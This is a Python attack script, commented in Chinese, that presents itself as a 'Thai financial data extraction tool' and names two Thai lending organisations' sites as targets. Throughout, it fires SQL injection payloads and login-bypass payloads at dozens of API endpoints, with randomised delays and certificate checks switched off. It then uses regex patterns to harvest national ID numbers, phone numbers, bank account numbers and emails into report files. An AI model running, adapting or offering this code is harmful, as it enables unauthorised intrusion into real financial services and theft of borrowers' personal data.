#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国金融数据提取工具
专门针对民间贷款和小额借贷平台
"""

import requests
import json
import time
import random
import re
import hashlib
import base64
from datetime import datetime
import sqlite3
import threading
from urllib.parse import urljoin, urlparse, parse_qs
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ThaiFinanceDataExtractor:
    """泰国金融数据提取器"""

    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15

        # 核心目标
        self.primary_targets = {
            "peacoop_or_th": {
                "name": "PEACOOP",
                "url": "https://peacoop.or.th",
                "login_url": "https://peacoop.or.th/login",
                "api_base": "https://peacoop.or.th/api",
                "description": "泰国信用合作社联合会",
                "data_types": ["会员信息", "贷款记录", "交易数据"]
            },
            "ngoenmun_com": {
                "name": "NgernMun",
                "url": "https://ngoenmun.com",
                "login_url": "https://ngoenmun.com/login",
                "api_base": "https://ngoenmun.com/api/v1",
                "description": "P2P借贷平台",
                "data_types": ["借款人信息", "投资记录", "还款数据"]
            }
        }

        # SQL注入载荷
        self.sql_payloads = [
            "' UNION SELECT 1,username,password,email FROM users--",
            "' UNION SELECT 1,member_id,member_name,phone FROM members--",
            "' UNION SELECT 1,loan_id,borrower_id,amount,status FROM loans--",
            "' UNION SELECT 1,account_number,balance,account_type FROM accounts--",
            "' UNION SELECT 1,transaction_id,amount,account_id,transaction_date FROM transactions--",
            "' UNION SELECT 1,customer_id,full_name,id_card,phone,address FROM customers--",
            "' UNION SELECT 1,application_id,applicant_name,loan_amount,interest_rate FROM loan_applications--",
            "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
            "' OR 1=1#",
            "admin'--",
            "' OR '1'='1",
            "' HAVING 1=1--"
        ]

        # 认证绕过载荷
        self.auth_bypass_payloads = [
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "admin", "password": "admin' --"},
            {"username": "' OR '1'='1", "password": "anything"},
            {"username": "admin", "password": "' OR 1=1--"},
            {"username": "' OR '1'='1 --", "password": "' OR '1'='1 --"},
            {"username": "admin' /*", "password": "password"},
            {"username": "", "password": "' OR '1'='1--"},
        ]

        self.extracted_data = []
        self.lock = threading.Lock()

    def extract_sql_data(self, target_info):
        """SQL注入数据提取"""
        target_name = target_info["name"]
        base_url = target_info["url"]
        api_base = target_info.get("api_base", base_url + "/api")

        logger.info(f"[SQL注入] 开始提取 {target_name} 数据")

        extracted_items = []

        # 测试端点
        test_endpoints = [
            "/users", "/members", "/customers", "/clients",
            "/loans", "/applications", "/transactions", "/accounts",
            "/api/users", "/api/members", "/api/customers", "/api/clients",
            "/api/loans", "/api/applications", "/api/transactions", "/api/accounts",
            "/api/v1/users", "/api/v1/members", "/api/v1/customers", "/api/v1/clients",
            "/api/v1/loans", "/api/v1/applications", "/api/v1/transactions", "/api/v1/accounts"
        ]

        for endpoint in test_endpoints:
            test_url = urljoin(api_base, endpoint)

            for payload in self.sql_payloads:
                try:
                    # GET请求测试
                    params = {"id": payload, "user_id": payload}
                    response = self.session.get(
                        test_url,
                        params=params,
                        timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    )

                    if response.status_code == 200 and len(response.text) > 100:
                        data_items = self.parse_response_data(response.text, target_name, "SQL注入")
                        extracted_items.extend(data_items)
                        logger.info(f"[成功] {target_name} - {endpoint} - 提取 {len(data_items)} 项数据")

                    # POST请求测试
                    post_data = {"id": payload, "user_id": payload, "action": "search"}
                    response = self.session.post(
                        test_url,
                        data=post_data,
                        timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    )

                    if response.status_code == 200 and len(response.text) > 100:
                        data_items = self.parse_response_data(response.text, target_name, "SQL注入")
                        extracted_items.extend(data_items)
                        logger.info(f"[成功] {target_name} - {endpoint} POST - 提取 {len(data_items)} 项数据")

                    time.sleep(random.uniform(0.5, 1.5))

                except Exception as e:
                    continue

        return extracted_items

    def bypass_auth_extract(self, target_info):
        """认证绕过数据提取"""
        target_name = target_info["name"]
        login_url = target_info["login_url"]

        logger.info(f"[认证绕过] 尝试绕过 {target_name} 认证")

        extracted_items = []

        for payload in self.auth_bypass_payloads:
            try:
                response = self.session.post(
                    login_url,
                    data=payload,
                    timeout=10,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                    allow_redirects=False
                )

                # 检查绕过成功
                if response.status_code in [200, 302]:
                    if 'dashboard' in response.text.lower() or 'welcome' in response.text.lower() or response.status_code == 302:
                        logger.info(f"[绕过成功] {target_name} - {payload['username']}")

                        # 获取会话后数据
                        data_items = self.extract_authenticated_data(target_info, self.session)
                        extracted_items.extend(data_items)

                        break

                time.sleep(random.uniform(1, 2))

            except Exception as e:
                continue

        return extracted_items

    def extract_authenticated_data(self, target_info, session):
        """从认证会话提取数据"""
        target_name = target_info["name"]
        base_url = target_info["url"]

        logger.info(f"[会话提取] 从 {target_name} 提取数据")

        extracted_items = []

        # 常见数据端点
        data_endpoints = [
            "/dashboard", "/profile", "/account", "/transactions",
            "/loans", "/applications", "/history", "/reports",
            "/api/dashboard", "/api/profile", "/api/account", "/api/transactions",
            "/api/loans", "/api/applications", "/api/history", "/api/reports"
        ]

        for endpoint in data_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = session.get(test_url, timeout=10)

                if response.status_code == 200:
                    data_items = self.parse_response_data(response.text, target_name, "认证会话")
                    extracted_items.extend(data_items)

                time.sleep(random.uniform(0.5, 1))

            except Exception as e:
                continue

        return extracted_items

    def parse_response_data(self, response_text, target_name, method):
        """解析响应数据"""
        data_items = []

        # 数据模式
        patterns = {
            "泰国身份证": r'\b\d{13}\b',
            "电话号码": r'\b0[689]\d{8}\b',
            "银行账户": r'\b\d{10,15}\b',
            "邮箱地址": r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            "金额": r'\b\d{1,3}(?:,\d{3})*(?:\.\d{2})?\b',
            "泰铢": r'\bTHB\s*\d+(?:,\d{3})*(?:\.\d{2})?\b',
            "日期": r'\d{4}[-/]\d{1,2}[-/]\d{1,2}',
            "用户名": r'["\']?([a-zA-Z][a-zA-Z0-9_]{3,20})["\']?',
        }

        for data_type, pattern in patterns.items():
            matches = re.findall(pattern, response_text)
            for match in matches[:20]:  # 限制每个类型最多20项
                data_item = {
                    "target": target_name,
                    "data_type": data_type,
                    "data_value": match,
                    "extraction_method": method,
                    "timestamp": datetime.now().isoformat()
                }
                data_items.append(data_item)

        return data_items

    def extract_target_data(self, target_key, target_info):
        """提取单个目标数据"""
        logger.info(f"开始提取: {target_info['name']}")

        target_results = {
            "target": target_info["name"],
            "url": target_info["url"],
            "extracted_data": [],
            "methods_used": [],
            "success": False
        }

        # 1. SQL注入提取
        sql_data = self.extract_sql_data(target_info)
        if sql_data:
            target_results["extracted_data"].extend(sql_data)
            target_results["methods_used"].append("SQL注入")
            target_results["success"] = True

        # 2. 认证绕过提取
        auth_data = self.bypass_auth_extract(target_info)
        if auth_data:
            target_results["extracted_data"].extend(auth_data)
            target_results["methods_used"].append("认证绕过")
            target_results["success"] = True

        logger.info(f"完成提取: {target_info['name']} - 提取 {len(target_results['extracted_data'])} 项数据")

        return target_results

    def run_extraction(self):
        """运行数据提取"""
        logger.info("开始泰国金融数据提取")

        all_results = []

        # 多线程提取
        with ThreadPoolExecutor(max_workers=3) as executor:
            future_to_target = {
                executor.submit(self.extract_target_data, key, value): key
                for key, value in self.primary_targets.items()
            }

            for future in as_completed(future_to_target):
                target_key = future_to_target[future]
                try:
                    result = future.result()
                    all_results.append(result)
                except Exception as e:
                    logger.error(f"提取失败 {target_key}: {str(e)}")

        # 生成报告
        self.generate_extraction_report(all_results)

        return all_results

    def generate_extraction_report(self, results):
        """生成提取报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # 统计
        total_data = sum(len(r['extracted_data']) for r in results)
        successful_targets = len([r for r in results if r['success']])

        # 按类型统计
        data_by_type = {}
        for result in results:
            for item in result['extracted_data']:
                data_type = item['data_type']
                data_by_type[data_type] = data_by_type.get(data_type, 0) + 1

        report = {
            "extraction_info": {
                "timestamp": timestamp,
                "total_targets": len(results),
                "successful_targets": successful_targets,
                "total_data_extracted": total_data,
                "data_by_type": data_by_type
            },
            "results": results,
            "summary": {
                "success_rate": f"{(successful_targets/len(results)*100):.1f}%" if results else "0%",
                "most_successful_target": max(results, key=lambda x: len(x['extracted_data'])) if results else None
            }
        }

        # 保存报告
        report_file = f"thai_finance_extraction_report_{timestamp}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        # 保存提取的数据
        data_file = f"thai_finance_extracted_data_{timestamp}.json"
        all_extracted_data = []
        for result in results:
            all_extracted_data.extend(result['extracted_data'])

        with open(data_file, 'w', encoding='utf-8') as f:
            json.dump(all_extracted_data, f, indent=2, ensure_ascii=False)

        logger.info(f"数据提取完成！")
        logger.info(f"成功目标: {successful_targets}/{len(results)}")
        logger.info(f"总数据量: {total_data} 项")
        logger.info(f"报告保存: {report_file}")
        logger.info(f"数据保存: {data_file}")

        return report

def main():
    print("=" * 80)
    print("泰国金融数据提取工具")
    print("=" * 80)
    print("目标: PEACOOP, NgernMun")
    print("方法: SQL注入, 认证绕过")
    print("=" * 80)

    extractor = ThaiFinanceDataExtractor()

    try:
        results = extractor.run_extraction()

        print("\n提取完成！")
        total_data = sum(len(r['extracted_data']) for r in results)
        successful = len([r for r in results if r['success']])

        print(f"成功目标: {successful}/{len(results)}")
        print(f"总提取数据: {total_data} 项")

    except KeyboardInterrupt:
        print("\n用户中断")
    except Exception as e:
        print(f"提取失败: {str(e)}")

if __name__ == "__main__":
    main()